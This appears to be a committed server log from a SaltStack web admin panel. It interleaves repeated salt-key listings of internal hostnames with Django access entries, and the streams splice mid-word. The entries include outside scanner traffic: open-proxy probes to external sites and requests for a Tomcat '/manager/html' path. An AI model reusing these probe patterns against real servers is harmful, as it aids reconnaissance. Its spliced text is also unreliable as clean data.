+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-mas[23/May/2016 09:54:19] "POST /saltstack/hosts/cmd_run HTTP/1.1" 200 10367
+[23/May/2016 09:54:43] "POST /saltstack/hosts/cmd_run HTTP/1.1" 200 10013
+[23/May/2016 09:54:57] "POST /saltstack/hosts/cmd_run HTTP/1.1" 200 9958
+ter
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_ap[23/May/2016 09:56:34] "POST /saltstack/hosts/cmd_run HTTP/1.1" 200 10690
+[23/May/2016 10:01:34] "GET /saltstack/hosts/list_cmd_run_info HTTP/1.1" 200 9372
+[23/May/2016 10:01:45] "GET /saltstack/hosts/list_cmd_run_info?page=2 HTTP/1.1" 200 9504
+Not Found: /http:/www.izhongsai.com/
+[23/May/2016 10:23:31] "GET http://www.izhongsai.com/ HTTP/1.1" 404 1676
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[23/May/2016 10:41:17] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1729
+[23/May/2016 10:43:01] "GET /saltstack/hosts/host_info HTTP/1.1" 200 9873
+[23/May/2016 10:43:02] "GET /saltstack/hosts/host_info?page=2 HTTP/1.1" 200 9362
+[23/May/2016 10:43:33] "GET /saltstack/hosts/host_info?page=1 HTTP/1.1" 200 9873
+Not Found: /http:/zc.qq.com/cgi-bin/common/attr
+[23/May/2016 10:55:29] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3292286189442501 HTTP/1.1" 404 1736
+[23/May/2016 10:58:04] "GET /saltstack/hosts/list_cmd_run_info HTTP/1.1" 200 9372
+[23/May/2016 10:58:10] "GET /saltstack/hosts/list_cmd_run_info?page=2 HTTP/1.1" 200 9504
+[23/May/2016 10:58:12] "GET /saltstack/hosts/list_cmd_run_info?page=3 HTTP/1.1" 200 7997
+[23/May/2016 10:58:13] "GET /saltstack/hosts/list_cmd_run_info?page=2 HTTP/1.1" 200 9504
+[23/May/2016 10:58:13] "GET /saltstack/hosts/list_cmd_run_info?page=1 HTTP/1.1" 200 9372
+[23/May/2016 10:58:14] "GET /saltstack/hosts/list_cmd_run_info?page=2 HTTP/1.1" 200 9504
+[23/May/2016 10:58:15] "GET /saltstack/hosts/list_cmd_run_info?page=3 HTTP/1.1" 200 7997
+[23/May/2016 10:58:16] "GET /saltstack/hosts/list_cmd_run_info?page=2 HTTP/1.1" 200 9504
+[23/May/2016 10:58:17] "GET /saltstack/hosts/list_cmd_run_info?page=1 HTTP/1.1" 200 9372
+[23/May/2016 10:58:34] "GET /saltstack/hosts/cmd_run HTTP/1.1" 200 9512
+[23/May/2016 11:00:07] "GET /index/ HTTP/1.1" 200 9338
+[23/May/2016 11:15:39] "GET /asset/asset/overview HTTP/1.1" 200 8853
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[23/May/2016 11:52:49] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1729
+[23/May/2016 12:05:26] "GET / HTTP/1.0" 200 3204
+[23/May/2016 12:39:14] "GET / HTTP/1.1" 200 3204
+Not Found: /http:/www.sogou.com/
+[23/May/2016 12:50:02] "GET http://www.sogou.com/?rands=_53624769006526804379520 HTTP/1.1" 404 1691
+Not Found: /http:/www.haosou.com/
+[23/May/2016 12:50:02] "GET http://www.haosou.com/?rands=_643836878417460245326228 HTTP/1.1" 404 1696
+Not Found: /http:/reg.renren.com/
+[23/May/2016 12:50:02] "GET http://reg.renren.com/?rands=_82806862822444804803724 HTTP/1.1" 404 1695
+Not Found: /http:/m.baidu.com/
+[23/May/2016 12:50:18] "GET http://m.baidu.com/?rands=_1266450700015162302222080 HTTP/1.1" 404 1685
+Not Found: /http:/www.kuaidaili.com/
+[23/May/2016 12:50:32] "GET http://www.kuaidaili.com/?rands=_52890118776964351810571097040 HTTP/1.1" 404 1713
+[23/May/2016 13:29:49] "GET /saltstack/hosts/list_cmd_run_info HTTP/1.1" 200 9372
+[23/May/2016 13:29:56] "GET /saltstack/hosts/list_cmd_run_info?page=2 HTTP/1.1" 200 9504
+[23/May/2016 13:29:57] "GET /saltstack/hosts/list_cmd_run_info?page=3 HTTP/1.1" 200 7997
+[23/May/2016 13:29:58] "GET /saltstack/hosts/list_cmd_run_info?page=2 HTTP/1.1" 200 9504
+[23/May/2016 13:29:59] "GET /saltstack/hosts/list_cmd_run_info?page=1 HTTP/1.1" 200 9372
+[23/May/2016 13:30:08] "GET /index/ HTTP/1.1" 200 9338
+[23/May/2016 14:36:39] "GET /saltstack/hosts/deploy/application HTTP/1.1" 200 9738
+[23/May/2016 14:42:53] "GET /saltstack/hosts/deploy/application HTTP/1.1" 200 9750
+[23/May/2016 14:42:53] "GET /static/bootstrap/css/bootstrap.min.css HTTP/1.1" 304 0
+[23/May/2016 14:42:53] "GET /static/css/sb-admin.css HTTP/1.1" 304 0
+[23/May/2016 14:42:53] "GET /static/font-awesome/css/font-awesome.min.css HTTP/1.1" 304 0
+[23/May/2016 14:42:53] "GET /static/js/jquery.js HTTP/1.1" 304 0
+[23/May/2016 14:42:53] "GET /static/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[23/May/2016 14:42:53] "GET /static/js/echarts.js HTTP/1.1" 304 0
+[23/May/2016 14:42:53] "GET /static/img/wait.gif HTTP/1.1" 304 0
+[23/May/2016 14:42:53] "GET /static/img/meitianhui.png HTTP/1.1" 304 0
+[23/May/2016 14:42:56] "GET /saltstack/hosts/deploy/application HTTP/1.1" 200 9750
+[23/May/2016 14:43:04] "GET /saltstack/hosts/deploy/application HTTP/1.1" 200 9750
+[23/May/2016 14:43:06] "GET /saltstack/hosts/cmd_run HTTP/1.1" 200 9512
+[23/May/2016 14:43:09] "GET /saltstack/hosts/deploy/application HTTP/1.1" 200 9750
+Not Found: /manager/html
+[23/May/2016 14:48:31] "GET /manager/html HTTP/1.1" 404 2641
+[23/May/2016 14:48:42] "GET /asset/asset/overview HTTP/1.1" 200 8853
+[23/May/2016 14:49:18] "GET /asset/asset/overview HTTP/1.1" 200 8854
+[23/May/2016 14:49:18] "GET /static/bootstrap/css/bootstrap.min.css HTTP/1.1" 304 0
+[23/May/2016 14:49:18] "GET /static/css/sb-admin.css HTTP/1.1" 304 0
+[23/May/2016 14:49:18] "GET /static/font-awesome/css/font-awesome.min.css HTTP/1.1" 304 0
+[23/May/2016 14:49:18] "GET /static/js/jquery.js HTTP/1.1" 304 0
+[23/May/2016 14:49:18] "GET /static/js/echarts.js HTTP/1.1" 304 0
+[23/May/2016 14:49:18] "GET /static/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[23/May/2016 14:49:18] "GET /static/img/meitianhui.png HTTP/1.1" 304 0
+[23/May/2016 14:49:43] "GET /asset/asset/overview HTTP/1.1" 200 8868
+[23/May/2016 14:49:44] "GET /static/css/sb-admin.css HTTP/1.1" 304 0
+[23/May/2016 14:49:44] "GET /static/bootstrap/css/bootstrap.min.css HTTP/1.1" 304 0
+[23/May/2016 14:49:44] "GET /static/font-awesome/css/font-awesome.min.css HTTP/1.1" 304 0
+[23/May/2016 14:49:44] "GET /static/js/jquery.js HTTP/1.1" 304 0
+[23/May/2016 14:49:44] "GET /static/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[23/May/2016 14:49:44] "GET /static/js/echarts.js HTTP/1.1" 304 0
+[23/May/2016 14:49:44] "GET /static/img/meitianhui.png HTTP/1.1" 304 0
+[23/May/2016 14:49:51] "GET /asset/asset/overview HTTP/1.1" 200 8868
+[23/May/2016 14:49:53] "GET /index HTTP/1.1" 301 0
+[23/May/2016 14:49:54] "GET /index/ HTTP/1.1" 200 9338
+[23/May/2016 14:53:39] "GET /index/ HTTP/1.1" 200 9353
+[23/May/2016 14:53:39] "GET /static/bootstrap/css/bootstrap.min.css HTTP/1.1" 304 0
+[23/May/2016 14:53:39] "GET /static/css/sb-admin.css HTTP/1.1" 304 0
+[23/May/2016 14:53:39] "GET /static/font-awesome/css/font-awesome.min.css HTTP/1.1" 304 0
+[23/May/2016 14:53:39] "GET /static/js/jquery.js HTTP/1.1" 304 0
+[23/May/2016 14:53:39] "GET /static/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[23/May/2016 14:53:39] "GET /static/js/echarts.js HTTP/1.1" 304 0
+[23/May/2016 14:53:39] "GET /static/img/meitianhui.png HTTP/1.1" 304 0
+i
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    [23/May/2016 14:53:57] "GET /index/ HTTP/1.1" 200 9354
+[23/May/2016 14:53:57] "GET /static/bootstrap/css/bootstrap.min.css HTTP/1.1" 304 0
+[23/May/2016 14:53:57] "GET /static/css/sb-admin.css HTTP/1.1" 304 0
+[23/May/2016 14:53:57] "GET /static/font-awesome/css/font-awesome.min.css HTTP/1.1" 304 0
+[23/May/2016 14:53:57] "GET /static/js/jquery.js HTTP/1.1" 304 0
+[23/May/2016 14:53:57] "GET /static/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[23/May/2016 14:53:57] "GET /static/js/echarts.js HTTP/1.1" 304 0
+[23/May/2016 14:53:57] "GET /static/img/meitianhui.png HTTP/1.1" 304 0
+[23/May/2016 14:55:06] "GET /index/ HTTP/1.1" 200 9357
+[23/May/2016 14:55:07] "GET /static/bootstrap/css/bootstrap.min.css HTTP/1.1" 304 0
+[23/May/2016 14:55:07] "GET /static/font-awesome/css/font-awesome.min.css HTTP/1.1" 304 0
+[23/May/2016 14:55:07] "GET /static/css/sb-admin.css HTTP/1.1" 304 0
+[23/May/2016 14:55:07] "GET /static/js/jquery.js HTTP/1.1" 304 0
+[23/May/2016 14:55:07] "GET /static/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[23/May/2016 14:55:07] "GET /static/js/echarts.js HTTP/1.1" 304 0
+[23/May/2016 14:55:07] "GET /static/img/meitianhui.png HTTP/1.1" 304 0
+Not Found: /manager/html
+[23/May/2016 14:55:15] "GET /manager/html HTTP/1.1" 404 2641
+[23/May/2016 14:55:47] "GET /index/ HTTP/1.1" 200 9356
+[23/May/2016 14:55:47] "GET /static/bootstrap/css/bootstrap.min.css HTTP/1.1" 304 0
+[23/May/2016 14:55:47] "GET /static/css/sb-admin.css HTTP/1.1" 304 0
+[23/May/2016 14:55:47] "GET /static/font-awesome/css/font-awesome.min.css HTTP/1.1" 304 0
+[23/May/2016 14:55:47] "GET /static/js/jquery.js HTTP/1.1" 304 0
+[23/May/2016 14:55:47] "GET /static/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[23/May/2016 14:55:47] "GET /static/js/echarts.js HTTP/1.1" 304 0
+[23/May/2016 14:55:47] "GET /static/img/meitianhui.png HTTP/1.1" 304 0
+[23/May/2016 14:56:36] "GET /index/ HTTP/1.1" 200 9338
+[23/May/2016 14:56:36] "GET /static/bootstrap/css/bootstrap.min.css HTTP/1.1" 304 0
+[23/May/2016 14:56:36] "GET /static/css/sb-admin.css HTTP/1.1" 304 0
+[23/May/2016 14:56:36] "GET /static/font-awesome/css/font-awesome.min.css HTTP/1.1" 304 0
+[23/May/2016 14:56:36] "GET /static/js/jquery.js HTTP/1.1" 304 0
+[23/May/2016 14:56:36] "GET /static/js/echarts.js HTTP/1.1" 304 0
+[23/May/2016 14:56:36] "GET /static/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[23/May/2016 14:56:36] "GET /static/img/meitianhui.png HTTP/1.1" 304 0
+[23/May/2016 14:57:40] "GET /index/ HTTP/1.1" 200 9331
+[23/May/2016 14:57:40] "GET /static/bootstrap/css/bootstrap.min.css HTTP/1.1" 304 0
+[23/May/2016 14:57:40] "GET /static/font-awesome/css/font-awesome.min.css HTTP/1.1" 304 0
+[23/May/2016 14:57:40] "GET /static/css/sb-admin.css HTTP/1.1" 304 0
+[23/May/2016 14:57:40] "GET /static/js/jquery.js HTTP/1.1" 304 0
+[23/May/2016 14:57:40] "GET /static/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[23/May/2016 14:57:40] "GET /static/js/echarts.js HTTP/1.1" 304 0
+[23/May/2016 14:57:40] "GET /static/img/meitianhui.png HTTP/1.1" 304 0
+[23/May/2016 14:57:54] "GET /index/ HTTP/1.1" 200 9327
+[23/May/2016 14:57:54] "GET /static/bootstrap/css/bootstrap.min.css HTTP/1.1" 304 0
+[23/May/2016 14:57:54] "GET /static/css/sb-admin.css HTTP/1.1" 304 0
+[23/May/2016 14:57:54] "GET /static/font-awesome/css/font-awesome.min.css HTTP/1.1" 304 0
+[23/May/2016 14:57:54] "GET /static/js/jquery.js HTTP/1.1" 304 0
+[23/May/2016 14:57:54] "GET /static/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[23/May/2016 14:57:54] "GET /static/js/echarts.js HTTP/1.1" 304 0
+[23/May/2016 14:57:54] "GET /static/img/meitianhui.png HTTP/1.1" 304 0
+- WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    [23/May/2016 14:58:02] "GET /index/ HTTP/1.1" 200 9336
+[23/May/2016 14:58:02] "GET /static/bootstrap/css/bootstrap.min.css HTTP/1.1" 304 0
+[23/May/2016 14:58:02] "GET /static/font-awesome/css/font-awesome.min.css HTTP/1.1" 304 0
+[23/May/2016 14:58:02] "GET /static/js/jquery.js HTTP/1.1" 304 0
+[23/May/2016 14:58:02] "GET /static/css/sb-admin.css HTTP/1.1" 304 0
+[23/May/2016 14:58:02] "GET /static/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[23/May/2016 14:58:02] "GET /static/js/echarts.js HTTP/1.1" 304 0
+[23/May/2016 14:58:02] "GET /static/img/meitianhui.png HTTP/1.1" 304 0
+[23/May/2016 14:59:27] "GET /index/ HTTP/1.1" 200 9339
+[23/May/2016 14:59:27] "GET /static/bootstrap/css/bootstrap.min.css HTTP/1.1" 304 0
+[23/May/2016 14:59:27] "GET /static/font-awesome/css/font-awesome.min.css HTTP/1.1" 304 0
+[23/May/2016 14:59:27] "GET /static/css/sb-admin.css HTTP/1.1" 304 0
+[23/May/2016 14:59:27] "GET /static/js/jquery.js HTTP/1.1" 304 0
+[23/May/2016 14:59:27] "GET /static/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[23/May/2016 14:59:27] "GET /static/js/echarts.js HTTP/1.1" 304 0
+[23/May/2016 14:59:27] "GET /static/img/meitianhui.png HTTP/1.1" 304 0
+[23/May/2016 14:59:29] "GET /index/ HTTP/1.1" 200 9339
+[23/May/2016 14:59:30] "GET /static/bootstrap/css/bootstrap.min.css HTTP/1.1" 304 0
+[23/May/2016 14:59:30] "GET /static/css/sb-admin.css HTTP/1.1" 304 0
